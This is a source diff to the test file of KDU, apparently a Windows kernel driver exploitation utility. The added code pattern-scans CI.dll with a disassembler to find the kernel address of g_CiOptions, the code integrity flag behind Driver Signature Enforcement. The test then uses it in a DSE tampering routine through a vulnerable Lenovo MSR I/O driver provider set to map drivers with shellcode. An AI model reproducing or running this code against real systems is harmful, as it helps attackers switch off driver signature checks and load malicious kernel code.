@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2025
+*  (C) COPYRIGHT AUTHORS, 2020 - 2026
 *
 *  TITLE:       TESTS.CPP
 *
-*  VERSION:     1.45
+*  VERSION:     1.47
 *
-*  DATE:        02 Dec 2025
+*  DATE:        25 Mar 2026
 *
 *  KDU tests.
 *
@@ -18,6 +18,188 @@
 *******************************************************************************/
 
 #include "global.h"
+
+NTSTATUS DebugQueryCiOptionsFromMappedImage(
+    _In_ HMODULE ImageMappedBase,
+    _In_ ULONG_PTR ImageLoadedBase,
+    _Out_ ULONG_PTR* ResolvedAddress,
+    _In_ ULONG NtBuildNumber)
+{
+    PBYTE ptrCode;
+    ULONG offset, k, expectedLength;
+    LONG relativeValue;
+    ULONG_PTR resolvedAddress;
+    hde64s hs;
+
+    if (ResolvedAddress == NULL)
+        return STATUS_INVALID_PARAMETER;
+
+    *ResolvedAddress = 0;
+
+    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, "CiInitialize");
+    if (ptrCode == NULL)
+        return STATUS_PROCEDURE_NOT_FOUND;
+
+    RtlSecureZeroMemory(&hs, sizeof(hs));
+    offset = 0;
+    relativeValue = 0;
+    resolvedAddress = 0;
+
+    if (NtBuildNumber < NT_WIN10_REDSTONE3) {
+
+        expectedLength = 5;
+
+        do {
+
+            hde64_disasm(&ptrCode[offset], &hs);
+            if (hs.flags & F_ERROR)
+                break;
+
+            if (hs.len == expectedLength) {
+                if (ptrCode[offset] == 0xE9) {
+                    relativeValue = *(PLONG)(ptrCode + offset + 1);
+                    break;
+                }
+            }
+
+            offset += hs.len;
+
+        } while (offset < 256);
+    }
+    else {
+
+        expectedLength = 3;
+
+        do {
+
+            hde64_disasm(&ptrCode[offset], &hs);
+            if (hs.flags & F_ERROR)
+                break;
+
+            if (hs.len == expectedLength) {
+
+                k = KDUValidateCiInitializeCode(ptrCode, offset, 256);
+                if (k != 0) {
+
+                    expectedLength = 5;
+                    hde64_disasm(&ptrCode[k], &hs);
+                    if (hs.flags & F_ERROR)
+                        break;
+
+                    if (hs.len == expectedLength) {
+                        if (ptrCode[k] == 0xE8) {
+                            offset = k;
+                            relativeValue = *(PLONG)(ptrCode + k + 1);
+                            break;
+                        }
+                    }
+                }
+            }
+
+            offset += hs.len;
+
+        } while (offset < 256);
+    }
+
+    if (relativeValue == 0)
+        return STATUS_UNSUCCESSFUL;
+
+    ptrCode = ptrCode + offset + hs.len + relativeValue;
+    relativeValue = 0;
+    offset = 0;
+    expectedLength = 6;
+
+    do {
+
+        hde64_disasm(&ptrCode[offset], &hs);
+        if (hs.flags & F_ERROR)
+            break;
+
+        if (hs.len == expectedLength) {
+            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
+                relativeValue = *(PLONG)(ptrCode + offset + 2);
+                break;
+            }
+        }
+
+        offset += hs.len;
+
+    } while (offset < 256);
+
+    if (relativeValue == 0)
+        return STATUS_UNSUCCESSFUL;
+
+    ptrCode = ptrCode + offset + hs.len + relativeValue;
+    resolvedAddress = ImageLoadedBase + (ULONG_PTR)(ptrCode - (PBYTE)ImageMappedBase);
+
+    *ResolvedAddress = resolvedAddress;
+    return STATUS_SUCCESS;
+}
+
+ULONG_PTR DebugQueryCurrentCiOptionsAddress(
+    _In_ ULONG NtBuildNumber)
+{
+    NTSTATUS ntStatus;
+    ULONG loadedImageSize;
+    ULONG_PTR imageLoadedBase;
+    ULONG_PTR kernelAddress;
+    HMODULE mappedImageBase;
+    WCHAR szFullModuleName[MAX_PATH * 2];
+
+    loadedImageSize = 0;
+    kernelAddress = 0;
+    szFullModuleName[0] = 0;
+
+    imageLoadedBase = supGetModuleBaseByName(CI_DLL, &loadedImageSize);
+    if (imageLoadedBase == 0) {
+        printf_s("[!] Could not query loaded base for CI.dll\r\n");
+        return 0;
+    }
+
+    if (!GetSystemDirectoryW(szFullModuleName, MAX_PATH)) {
+        printf_s("[!] GetSystemDirectoryW failed, gle=%lu\r\n", GetLastError());
+        return 0;
+    }
+
+    _strcat(szFullModuleName, L"\\");
+    _strcat(szFullModuleName, CI_DLL);
+
+    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mappedImageBase == NULL) {
+        printf_s("[!] Could not load CI.dll for pattern search, gle=%lu\r\n", GetLastError());
+        return 0;
+    }
+
+    printf_s("[+] CI.dll mapped at %p for analysis\r\n", mappedImageBase);
+    printf_s("[+] CI.dll loaded kernel base %p, image size 0x%lX\r\n",
+        (PVOID)imageLoadedBase,
+        loadedImageSize);
+
+    ntStatus = DebugQueryCiOptionsFromMappedImage(
+        mappedImageBase,
+        imageLoadedBase,
+        &kernelAddress,
+        NtBuildNumber);
+
+    if (!NT_SUCCESS(ntStatus)) {
+        printf_s("[!] DebugQueryCiOptionsFromMappedImage failed, ntstatus=0x%08lX\r\n", ntStatus);
+        FreeLibrary(mappedImageBase);
+        return 0;
+    }
+
+    if (kernelAddress < imageLoadedBase ||
+        kernelAddress >= imageLoadedBase + loadedImageSize)
+    {
+        printf_s("[!] Resolved address %p is outside loaded CI.dll\r\n", (PVOID)kernelAddress);
+        FreeLibrary(mappedImageBase);
+        return 0;
+    }
+
+    printf_s("[+] g_CiOptions resolved at %p\r\n", (PVOID)kernelAddress);
+
+    FreeLibrary(mappedImageBase);
+    return kernelAddress;
+}
 
 VOID KDUTestLoad()
 {
@@ -55,7 +237,7 @@ VOID KDUTestLoad()
 
 VOID KDUTestDSE(PKDU_CONTEXT Context)
 {
-    ULONG_PTR g_CiOptions = 0xfffff80541c391b0;//need update
+    ULONG_PTR g_CiOptions = DebugQueryCurrentCiOptionsAddress(USER_SHARED_DATA->NtBuildNumber);
     ULONG_PTR oldValue = 0, newValue = 0x0, testValue = 0;
     KDU_PROVIDER* prov = Context->Provider;
 
@@ -312,14 +494,14 @@ VOID KDUTest()
 
     // KDUTestLoad();
     // TestSymbols();
-    Context = KDUProviderCreate(KDU_PROVIDER_TPUP,
+    Context = KDUProviderCreate(KDU_PROVIDER_LENOVOMSRIO,
         FALSE,
         NT_WIN10_20H1,
         KDU_SHELLCODE_V1,
         ActionTypeMapDriver);
 
     if (Context) {
-        TestSuperfetch(Context);
+        //TestSuperfetch(Context);
         //TestSuperfetchWithDriver(Context);
         //TestBrute(Context);
         KDUTestDSE(Context);
